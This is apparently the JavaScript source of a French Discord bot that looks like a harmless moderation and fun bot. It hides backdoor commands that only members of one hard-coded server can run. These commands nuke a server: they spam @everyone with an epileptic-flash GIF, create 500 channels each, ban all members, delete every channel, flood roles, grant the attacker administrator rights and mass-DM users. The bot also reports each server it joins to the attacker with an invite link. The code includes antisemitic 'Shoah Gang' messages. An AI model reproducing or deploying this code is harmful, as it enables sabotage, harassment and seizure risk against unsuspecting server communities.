const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
const moment = require("moment");
 var prefix = "."
  var perms = ["ADMINISTRATOR", "MANAGE_CHANNELS"]
bot.on('ready',() => {
  //invit link
  console.log("---------------------------")
});  

bot.on('message', message => {
 
  const mute = require("./commands/moderation/mute.js");
  const unmute = require("./commands/moderation/unmute.js");
  
  mute(message, prefix , bot)
  unmute(message, prefix , bot)
  
  
  });


bot.on('message', msg => {
  if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
    return;
  }
 if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
    
  if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
      "SHOAH GANG ON THE BEAT \n"+
      "https://discord.gg/8vtFryt \n"+
      "https://discord.gg/s5Y2RfG").catch(e => {});
    }, 450)
  } 

if (msg.content === '.oupss') {
  if(guild.member(bot.user).hasPermission(perms)){

    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('shoah_gang_te_baise', 'voice').catch(e => {});
        msg.guild.createChannel('shoah_gang_te_baise', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
}


if (msg.content === '.banev') {
  if(guild.member(bot.user).hasPermission("BAN_MEMBERS")){
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }
}


if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
  if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){ 
    console.log(`Commande .pardon par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  }


  if (msg.content === '.roleflood') {
    if(guild.member(bot.user).hasPermission("MANAGE_ROLES")){ 

    console.log(`Commande .roleflood par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
      msg.member.addRole(role).catch(e => {});
    i++
    }, 100).catch(e => {});
       });
    
      }
    }

  if(msg.content === ".del"){
    if(guild.member(bot.user).hasPermission("MANAGE_CHANNELS")){ 
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete().catch(e => {});
    });
  }
}


  if(msg.content === ".mp"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
        "SHOAH GANG ON THE BEAT \n"+
        "https://discord.gg/8vtFryt \n"+
        "https://discord.gg/s5Y2RfG").catch(e => {});
      }, 450)

      }   
  })
  } 


 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    var membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("#FFFFFF")
    .setImage(membere.user.avatarURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    return message.channel.send(avatar_embed).catch(e => {});
}  
if(message.content.startsWith(".say")) {
  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("#FFFFFF")
.setTitle(" ")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]

    let ball_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
    .setDescription("**"+question+"**")
    .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(bot.user.iconURL)
    return message.channel.send(ball_embed).catch(e => {});
  }
  
})

  bot.on("message", message => {
  if(message.content.startsWith(".serverinfo")){
    moment.locale("fr");
    var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("#FFFFFF")
    .addField("Nom", message.guild.name)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .addField("Nombre de membre", message.guild.memberCount)
    .addField("Date de Creation", date_de_creation_du_serv)
    .addField("Nombre de Channel", message.guild.channels.size)
    .addField("Nombre d'emoji", message.guild.emojis.size)
    .addField("Liste Des Emojis", message.guild.emojis.map(e=>e.toString()).join(" "))
    .setThumbnail(message.guild.iconURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    return message.channel.send(serverinfo_embed).catch(e => {});
  }})

  bot.on("message", message => {
  if(message.content.startsWith(".userinfo")){
    var membere2 = message.mentions.members.first()
    moment.locale('fr')
    var date_de_creation_du_compte = moment(membere2.user.createdTimestamp).format("LLLL") 

    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("#FFFFFF")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Id du Membre", membere2.user.id)
    .addField("Date de Creation Du Compte", date_de_creation_du_compte)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Tag du Membre", membere2.user.tag)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
 message.channel.send(userinfo_embed) 
 return;
  }
})

bot.on('guildMemberAdd', member => {

  member.createDM().then(prive => {
    let bienvenue_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .addField(`Bienvenue ${member.user.username}`, "Viens parler avec les joueurs !")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(member.iconURL)
    .setAuthor("Gon bot")
    prive.send(bienvenue_embed).catch(e => {});
  })
})

bot.on("message", message => {
  if(message.content === '.createinvite'){
    message.channel.createInvite().then(invite => {
      message.reply(` :white_check_mark: ** Voici ton invite : https://discord.gg/${invite.code} ** :white_check_mark:`).catch(e => {});
    })
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".kick")){
    var membere2 = message.author
    var membere = message.guild.member(message.mentions.members.first());
    
    if(!message.member.hasPermission("KICK_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour kick** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour kick**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
    }
    else {
  membere.kick().then(member => {
    return message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
  }).catch(e => {});
    }
  }
  if(message.content.startsWith(".ban") & message.content != '.banev'){
    var membere2 = message.author
    let membere = message.guild.member(message.mentions.members.first());
    if(!message.member.hasPermission("BAN_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour ban** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour ban**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
    }
    else if(!membere.bannable){
      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
    }
    else {
  membere.ban().then(member => {
   return message.channel.send(":white_check_mark:  `"+membere.user.username+"`  **à été ban par ** `"+membere2.username+"`  :white_check_mark:").catch(e => {});
  }).catch(e => {});
}
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".flip")){
    var flip = ["Pile", "Face"]
    var reponse = flip[Math.floor(Math.random()*2)]
    let flip_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .addField("FLIP", " :moneybag: La piece affiche : **"+reponse+"**")
    message.channel.send(flip_embed).catch(e => {});
    }
    if(message.content === ".c"){
      var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
      var voila = voilatableau[Math.floor(Math.random()*6)]
      let voila_embed = new Discord.RichEmbed()
      .setColor("#FFFFFF")
     .setDescription(":beer: **"+voila+"** :beers: ")
      return message.channel.send(voila_embed).catch(e => {});
    }
})

      bot.on("guildCreate", guild => {
        if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
        else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
      });
      bot.on('guildDelete', guild => {
        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
      })
      bot.on("message", message => {
        if (message.content === '.rainrole') {
          if (message.deletable) message.delete();
                message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:').catch(e => {});
          if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ").catch(e => {});
          message.guild.createRole({name: 'Rainbow'}).catch(e => {});
        }
      
        if (message.content === '.rainbow') {
          message.reply(':rainbow: La commande est maintenant activé, il te reste juste à attribué le role! :rainbow:')
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: ** Tu n'as pas la permission `ADMINISTRATOR` ** :x:");
        if (!message.guild.roles.find("name", "Rainbow")) return console.log(":x: **  Le role `Rainbow` n'existe pas ** :x:")
        var myRainbow = message.guild.roles.find("name", "Rainbow")
        let i = 0;
          let interval = setInterval(function () {
myRainbow.setColor("RANDOM").catch(e => {});
          
        }, 750)
      }
      if(message.content.startsWith(".clear")){
        var texte = message.content.split(" ").slice(1).join(" ")
        if(isNaN(texte) == false){
        if(!message.member.hasPermissions("MANAGE_MESSAGES")){
          message.channel.send(":x: **Tu n'as pas la permissions `MANAGE_MESSAGES` ** :x:").catch(e => {});
      }
      else if(!message.guild.member(bot.user).hasPermission("MANAGE_MESSAGES")){
        message.reply(":x: **Je n'ai pas assez de permission pour gérer les messages**").catch(e => {});
      }
      else if(!texte){
        message.channel.send(":x: **Tu dois écrire un nombre de message à supprimé** :x:")
      }
        else if(texte < 1 & texte > 900){
          message.channel.send(":x: **Le nombre de message à clear doit etre supérieur à `1` et inferieur et `900`** :x:").catch(e => {});
        }
        else {
          message.channel.bulkDelete(texte).then(number => {
            message.channel.send(":white_check_mark: ** J'ai supprimé `"+texte+"` messages **").catch(e => {});
          })
        }

      }
      else {
        message.channel.send(":x: **Vous devez entré un nombre entier** :x:").catch(e => {});
      }
    }
      })

bot.login(process.env.BOT_TOKEN); 
